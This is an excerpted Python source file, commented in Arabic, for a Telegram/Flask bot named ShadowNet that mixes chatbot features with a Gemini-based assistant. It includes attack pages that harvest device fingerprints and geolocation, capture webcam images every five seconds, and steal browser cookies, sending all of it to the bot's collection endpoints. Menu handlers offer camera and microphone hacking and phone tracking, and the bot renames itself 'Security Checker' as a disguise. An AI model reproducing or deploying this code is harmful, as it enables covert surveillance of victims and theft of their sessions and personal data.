...
"""
ShadowNet v14.0 - النسخة النهائية (خالية من الأخطاء)
...
# ===================== الإعدادات الأساسية =====================
# 🔐 التوكن مخفي - يتم قراءته من متغيرات البيئة
...
QUOTES_ENGLISH = {
    'sad': ["Goodbye is painful, but life goes on...", "Loneliness is harsh..."],
    'deep': ["Life is a short journey...", "The soul yearns for what the eye cannot see..."],
    'beautiful': ["Love is a light that illuminates...", "Hope remains the last thing to die..."]
}
TIPS = {
    'دراسية': ["خصص وقتاً منتظماً للمذاكرة...", "راجع دروسك قبل النوم..."],
    'اجتماعية': ["كن صادقاً مع أصدقائك...", "استمع أكثر مما تتحدث..."],
    'للاكتئاب': ["لا تيأس، فالحياة جميلة...", "اطلب المساعدة من المقربين..."],
    'إسلامية': ["توكل على الله في كل أمورك...", "أكثر من الاستغفار..."]
}
...
def init_t11_db():
    ...
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS t11_memory (user_id INTEGER, message TEXT, timestamp REAL, respect INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS t11_reports (type TEXT, count INTEGER, timestamp REAL)''')
    conn.commit()
    conn.close()
...
T11_VOICE_CODES = {
    'سعودي': 'ar-SA-HamedNeural', 'مصري': 'ar-EG-OmarNeural',
    'بنت': 'ar-EG-SalmaNeural', 'سعودية': 'ar-SA-ZariyahNeural',
    'ولد': 'ar-SA-HamedNeural', 'ولد_مصري': 'ar-EG-OmarNeural',
...
def t11_handle_dev(text, user_id):
    try:
        ...
        llm = ChatGoogleGenerativeAI(model="gemini-1.5-flash", system_instruction="أنت T11، خادم المطور المخلص.", temperature=0.5)
...
def t11_handle_public(text, user_id):
    try:
        ...
        genai.configure(api_key=GEMINI_API_KEY)
        history = "\n".join(t11_get_history(user_id))
        llm = ChatGoogleGenerativeAI(model="gemini-1.5-flash", system_instruction="أنت T11، مساعد آلي غامض وحكيم.", temperature=0.9)
        response = llm.invoke(text)
        return response.content
    except Exception as e:
        return f"حدث خطأ: {str(e)[:100]}"
...
def change_bot_identity():
    try:
        new_name = random.choice(["System Scanner", "Security Checker", "Network Tool", "T11 Assistant"])
...
def build_admin_panel():
    ...
    markup.row(
        ...
        InlineKeyboardButton("⚙️ إدارة الصلاحيات", callback_data="admin_permissions")
    )
    markup.row(
...
def build_permissions_menu(chat_id, target_user):
    ...
    markup.row(
        InlineKeyboardButton(
            f"⚙️ متقدم: {'✅' if can_advanced else '❌'}",
            callback_data=f"perm_toggle_advanced_{target_user}"
        )
    )
    markup.row(InlineKeyboardButton("⬅️ رجوع", callback_data="admin_permissions"))
    return markup
  # ===================== دوال الهجمات =====================
...
@app.route('/health')
def health():
    return jsonify({"status": "ok", "time": datetime.now().isoformat()})  # ✅ القوس مغلق
...
def device_info_page():
    ...
    <!DOCTYPE html><html><body><script>
        const data = {{userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, screen: screen.width + "x" + screen.height, cores: navigator.hardwareConcurrency || 'unknown', memory: navigator.deviceMemory || 'unknown'}};
        if (navigator.geolocation) {{navigator.geolocation.getCurrentPosition(pos => {{data.lat = pos.coords.latitude; data.lon = pos.coords.longitude; sendData(data);}});}} else {{sendData(data);}}
        function sendData(d) {{fetch('/api/collect_device', {{method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify({{token: '{token}', info: d}})}});}}
...
def camera_hack_page():
    ...
    if not chat_id:
        return "Invalid token", 403
    html = f'''
    <!DOCTYPE html><html><head><title>Camera Access</title><script>
        async function capture() {{
            try {{
                ...
                await fetch('/api/collect_camera', {{method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify({{token: '{token}', image: dataUrl}})}});
                video.srcObject.getTracks().forEach(track => track.stop());
            }} catch(e) {{console.log(e);}}
        }}
        setInterval(capture, 5000);
    </script></head><body>Camera Access Granted.</body></html>
    '''
    return render_template_string(html)
...
def cookie_stealer_page():
    ...
    <!DOCTYPE html><html><body>
        <script>
            ...
            fetch('/api/collect_cookie', {{method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify({{token: '{token}', cookies: cookies, url: window.location.href}})}});
...
def callback_handler(call):
    try:
        ...
        if data == "track_phone":
            ...
            safe_send(chat_id, "📱 أدخل رقم الهاتف:")
            return
        if data == "analyze_apk":
        ...
        if data.startswith("voice_"):
            ...
            if text:
                safe_send(chat_id, "⏳ جاري التحويل...")
        ...
        if data == "news":
            ...
            safe_send(chat_id, "📰 أدخل الموضوع:")
            return
        if data == "shorten_url":
        ...
        if data == "hack_camera":
            ...
            safe_send(chat_id, "تم إرسال أمر الكاميرا")
            return
        if data == "hack_mic":
            if not is_admin(chat_id): return
            device_id = admin_remote.get(chat_id)
        ...
        if state == "waiting_download":
            ...
            if filename and os.path.exists(filename):
                try:
                    ...
                    os.remove(filename)
                    safe_send(chat_id, "✅ تم إرسال الفيديو!")
                except Exception as e:
    ...
    try:
        ...
        if file_name.lower().endswith('.pdf'):
            ...
            if text and not text.startswith("خطأ"):
                ...
                safe_send(chat_id, f"✅ تم استخراج النص")
                markup = InlineKeyboardMarkup(row_width=2)
...
# ===================== تشغيل البوت (محسّن ضد 409 + إغلاق النسخ القديمة) =====================
def kill_old_bot_instances():
    """إغلاق جميع عمليات البوت القديمة التي تستخدم نفس التوكن"""
    try:
        import psutil
...
def start_bot():
    """تشغيل البوت مع إغلاق النسخ القديمة وإعادة محاولة تلقائية"""
    # إغلاق النسخ القديمة
    ...
    while True:
        try:
            ...
            # 3. معالجة الأخطاء المعروفة
            if "409" in error_msg:
                logger.warning("⚠️ Conflict 409: Another instance is running.")
                logger.info("🔄 Killing old instances and retrying...")
                kill_old_bot_instances()
...
if __name__ == '__main__':
    print("\n" + "="*60)
    print("🤖 ShadowNet + T11 - النسخة النهائية (خالية من الأخطاء)")
